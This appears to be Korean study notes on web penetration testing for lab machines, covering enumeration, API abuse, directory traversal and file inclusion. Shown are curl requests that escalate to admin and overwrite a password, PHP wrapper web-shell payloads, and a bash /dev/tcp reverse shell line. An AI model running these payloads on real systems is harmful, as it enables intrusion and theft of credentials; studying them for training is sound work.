# Web hacking Summay
## 들어가며
웹 해킹이라는 영역은 사실 웹 서비스의 종류와 그 구현이 여러가지인 만큼 따로 하나의 카테코리로 분류해될 정도로 방대한 내용을 가지고 있다. 여기서는 http, https 서비스가 발견되었을 때 기초적으로 수행해야 할 취약점 탐색에 대해 다루도록 하겠으며 심화적인 웹 해킹 내용은 다루지 않겠다.

## Burp suite

웹해킹을 하려면 반드시 웹 프록시 도구를 사용해야 한다. 그 중 burp suite (commuity)를 사용하려고 한다. 여러가지 기능을 제공하지만 우리는 다음의 기능을 주로 사용할 것이다.

- proxy (intercept)
- repeater
- intruder

## HTTP Enumeration

일반적인 사용자는 index 페이지로 웹서비스를 시작하겠지만 우리는 nmap을 통한 포트 스캐닝 결과를 먼저 열거하고 분석한다. 포트가 열려있다는 가정하에 2가지 정보에 주목하자. 

### Port Scanning Information

1. -sV로 나오는 버젼 정보
웹서버의 버젼은 웹 취약점과 관련 없이 바로 공격포인트로 연결될 수 있으니 놓치지 말자
2. -sC로 나오는 특이한 정보
사용된 프레임워크 등은 자체적으로 취약점을 가지고 있는 경우 손쉽게 공격 포인트로 이어질 수 있다. 

### web page analyze

포트 스캐닝 정보 분석을 완료하였다면 우리는 직접적으로 웹서버와의 통신을 통해 웹 서비스 취약점을 탐색할 것이다. 일반 사용자는 웹브라우저를 통해 웹서비스를 이용하지만 우리는 웹 프록시를 이용하여 웹 서비스를 분석할 것이다. 웹 프록시를 이용하면 http request와 response를 확인할 수 있고 웹해킹에 유용한 도구들을 사용할 수 있다. 또한 우리는 웹브라우저의 디버깅 모드를 사용할 것인데 이 모드로 눈에 보이는 페이지가 어떤 http 코드로 작성되어 있는지 확인할 수 있다.

다음의 내용에 주목해보자 : js(난독화된 경우에는 ai service를 이용하도록 하자), framework, input hidden ,comment, dom

### response header 내용 조사
해더는 웹서버에 대한 정보 및 기술 스택에 대한 정보를 담고 있을 때가 있으니 살펴보자. 헤더 정보 해석이 어려운 경우 AI service를 통해 분석을 하면 어떤 프레임워크를 사용할 확률이 높은지까지 분석해주니 사용을 권장한다.

다음의 헤더들은 특히 있다면 눈여겨 보도록 하자 
- X-Powered-By : 어떤 벡엔드 요소를 사용하는지 나타냄
- x-amz-cf-id : amazon cloudfornt 를 사용한다는 뜻
- X-Aspnet-Version : asp를 사용한다는 뜻

### sitemap 혹은 robots.txt 조사
크롤링 봇에 대한 사항을 담은 내용으로 자신의 웹페이지가 검색엔진에 뜨길 바라는 운영자 입장에서는 꼭 존재해야 하지만 공격자 입장에서는 전반적인 구조와 혹시 모를 민감한 페이지나 정보를 얻을 수도 있는 부분이니 꼭 조사할 것

### error page (400 , 500)
일반적으로 custom error page를 사용하지만 default error page를 사용하는 경우 해당 웹 서버가 어떤 웹 서버를 인지, 어떤 백엔드 언어와 프레임워크를 사용하는지를 간접적으로 드러내게 된다. 이 자체로는 별거 아닌 정보가 다른 정보와 연계될 경우, 상식적으로 발견할 수 없을 취야

### web directory & file searching

웹 취약점을 탐색할 때에는 우리가 일반적으로 찾을 수 없는 경로에 해답이 있는 경우가 더러 있다. 이런 경로를 발견하는 방법은 brute force가 기본이 되나 시간이 오래걸리기 때문에 보통 전용 사전을 이용하여 경로를 탐색한다. 우리는 gobuster(cli),dirbuster(gui),feroxbuster를 사용할 것이다. 

```bash
feroxbuster [target_ip]
```

## vhost & subdomain enumeration
일반적으로는 vhost 기능은 웹서버 파일에서 해당 설정을 찾거나 하는 등의 subdomain이 있다는 사실을 알아낸 후에 접근하지만 아무런 사실 없이 ffuf를 이용해서 subdomain을 찾아야 하는 경우도 있다. 특히 현재 사이트가 아직 개발 중이거나 아니면 현재 사이트를 원본으로 두고 다른 subdomain을 통해 test 한다는 시나리오가 주를 이룬다.

## API Enumeration
web api는 웹 서버 또는 웹 브라우저를 위한 애플리케이션 프로그래밍 인터페이스이다. HTTP 서비스이고 다양한 클라이언트에서 접근이 가능하도록 설계되어있다. Web 환경을 통해 제공되는 데이터 CRUD인터페이스를 제공한다. 
![alt text](image-4.png)

여기서 제공되는 기능은 매우 다양하지만 우리가 보통 주목하는 기능 로그인과 인증에 관련된 기능이다. 특히 admin 등 관리자와 관련된 단어가 endpoint 경로에 포함되어 있다면 중요도는 더욱 올라간다고 볼 수 있을 것이다. 물론 중요도가 낮아보이는 api에서도 우리가 다룰 web 취약점이 있을 수 있으므로 enumeration에서 배제해서는 안된다. (특히 구현을 어떻게 했을지를 추측한다면 특정 파라미터와 어떤 취약점이 관련성이 높은지를 판단할 수 있다)

일반적으로 api는 사용자를 구분하기 위하여 별도의 api key(php session, JWT 등)를 사용한다. key가 없는 상황이라면 key 없이 접근이 허용되는 api를 탐색하거나 key를 획득하기 위한 방법(보통은 로그인을 하는 api endpoint가 따로 있다)을 찾아야 한다.

api를 탐색하는 과정은 gobuster를 사용해도 되지만 recursive하게 자동으로 탐색해주는 feroxbuster를 사용하는 것도 좋은 방법이다. 

```bash
feroxbuster -u http://api.mentorquotes.htb/admin/ --methods GET,POST
```
단어장 추천 : /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt

### enumeration 과정 예시
1. open 된 포트에 api endpoint를 노리고 사전 공격을 수행 (/user/v1 하위의 여러 endpoint를 알게 됨)
2. /user/v1 에 get 요청 => json data 획득 (여러 계정의 존재 여부 + email)
3. /user/v1/admin/password 에 get 요청 => 405로 다른 method를 사용해야 함을 알게 됨
4. /user/v1/login 에 get 요청 => 405로 다른 method를 사용해야 함을 알게 됨
5. login 기능은 기본적으로 username과 password를 요하므로 파라미터를 추측
6. /user/v1/login 에 admin/fake로 post 요청 => 로그인은 실패 했지만 올바른 파라미터 구성에 대해 파악 완료
```
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```
7. /user/v1/register 에 새계정/새비번으로 post 요청 => email도 필수 파라미터임을 알게 됨
8. /user/v1/register에 email를 추가하여 post 요청 => 등록 성공
9. 등록한 계정으로 로그인을 시도하여 성공하였으나 역시 admin 하위 endpoint에는 동일하게 접근 불가 => 관리자 계정이 필요함
10. /user/v1/register에 email 과 **admin:"True"**(추측)를 추가하여 post 요청 => 등록 성공
11. 새로 등록한 계정으로 로그인 시도 => 성공 + JWT 인증 토큰 획득
12. /user/v1/admin/password에 인증 토큰을 사용하여 post 요청으로 override 시도 => 405
13. 같은 방식으로 put 요청 => 오류 메세지 없음
```
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```
12. override 한 비번으로 로그인 시도 => 성공
```
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```
### 과제
twomillion.htb를 공략하여 admin 계정으로 로그인에 성공하라 (not root, not reverse shell, only web)


## Directory Traversal
### 이론
web application이 사용자 입력을 필터링하지 않아 생기는 취약점으로 대부분은 www-data 사용자의 권한으로 파일 조회가 가능해진다. 모든 유저가 열람할 수 있는 /etc/passwd를 linux에서 표준으로 취약점 판단여부의 기준으로 삼고 있으며 windows는 C:\Windows\System32\drivers\etc\hosts를 기준으로 판단한다. ssh key, log, config등 주요 파일들이 향후 타깃이 된다. (즉 직접적으로 credential을 획득할 가능성이 있거나 snmp 정보와 같이 시스템과 관련된 정보를 획득할 만한 파일을 노린다)

## 탐색 과정
http 요청을 보내는 파라미터 중에 파일명 혹은 경로와 관련된 것에 주목하여 공격을 시도한다. ../를 이용한 상대 경로로 공격을 시도하는 경우 현재 디렉토리가 어디인지 알 수 없는 경우가 많으므로 1~8개의 ../ 를 시도하는 것을 추천한다. 특정 path를 추론하기 어려운 경우 에러메세지를 출력하도록 시도하고 그 에러메세지 속에 사용할만한 경로가 포함되어 있는지 확인하는 것도 방법이다.

## 연계
어떤 임의의 파일을 활용하는가에 따라 다양한 시도들이 가능하다. (키워드 : 설정, 계정, 버젼)
### home dir
- linux에서는 /etc/passwd에서 사용자를 파악 후 각 홈 디렉토리에서 ssh key가 있는지 파악하고 있다면 그 key를 복사하여 ssh를 통해 해당 유저의 쉘을 획득한다. 
- window는 그런 정해진 경로가 없지만 documentation을 통해 config 나 log 의 정해진 위치를 파악할 수 있으니 이를 이용하자.
### process enum
- /proc/{pid}/cmdline을 통해 process enumeration이 가능하다. (수상한 pid 혹은 network service가 확인된 경우 진행) : backdoor.htb
### 설정 파일
- word press의 wp-config.php 파일로 db credential을 획득한다. 
- /etc/apache2/sites-enabled/000-default.conf를 확인한다.
- /etc/apache2/sites-enabled/{domain name}.conf
- express(node.js)인 경우 index.js , main.js, server.js, app.js 등의 파일 탐색 
- spring boot인 경우  pom.xml 

## 예제
topology.htb 
## 과제 
- inject.htb (user flag)

## file Inclusion
### 이론
file inclusion은 임의의 파일을 읽게 한다는 점에서 directory traversal 취약점과 동일하게 다뤄지는 부분이 있다. 그러나 file inclusion의 경우 상황에 따라 command execution으로 연결될 수 있다는 것이 가장 큰 차이점이다. 웹앱의 소스 코드에 임의 파일 내용을 포함시킬 때 웹앱에서 실행할 수 있는 코드가 포함된 파일을 포함시키면 해당 코드는 웹앱에 의해 실행되게 된다.

\* 참고사항 : **php를 통해** code execution이 이뤄지는 경우 sh(bourn shell)로 명령어가 처리된다. 따라서 **sh 문법에 맞는** 리버스 쉘 명령을 넣어주어야 한다. 
예시 : 
```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

### case(senario)
- lfi + log posioning으로 실행 및 실행 결과를 확인할 수 있다. : toxic(ch)
- lfi + php wrapper(data) : allow_url_include가 enable 되어 있어야함


### php wrapper
php wrapper가 허용되는 환경은 default가 아니지만 만약 허용되는 경우에 내부 정보에 대한 더 세밀한 조사, 특별히 웹소스에 대한 조사가 가능하다.

다음의 코드를 통해 php 파일을 base64로 변환하여 php 원문을 확보할 수 있다.
```
?[parameter]=php://filter/convert.base64-encode/resource=[file Path]
```

Allow_url_include가 활성화 되어 있는 경우 다음과 같이 직접적으로 페이지에 원하는 데이터를 삽입할 수 있다.
```
[parameter]=data://text/plain,<?php%20echo%20system('ls');?>
```
bad string을 방지하기 위해 다음과 같은 방법도 가능하다.
```
echo -n '<?php echo system($_GET["cmd"]);?>' | base64

data://text/plain;base64,[base64 code]&cmd=ls
```

### RFI (Remote File Inclusion)
기본적으로 disabled 된 allow_url_include가 enable 되어야 가능한 공격이나 만약 해당 어플리케이션이 외부 파일이나 라이브러리를 사용하는 경우 enable 되어 있는 경우가 있으니 배제하지 말고 잘 살피도록 하자

### 예제
toxic (+ deserialization)
### 과제
- TartarSauce.htb 
- bountyHunter.htb => xee attack에 대해 알려주고 시작

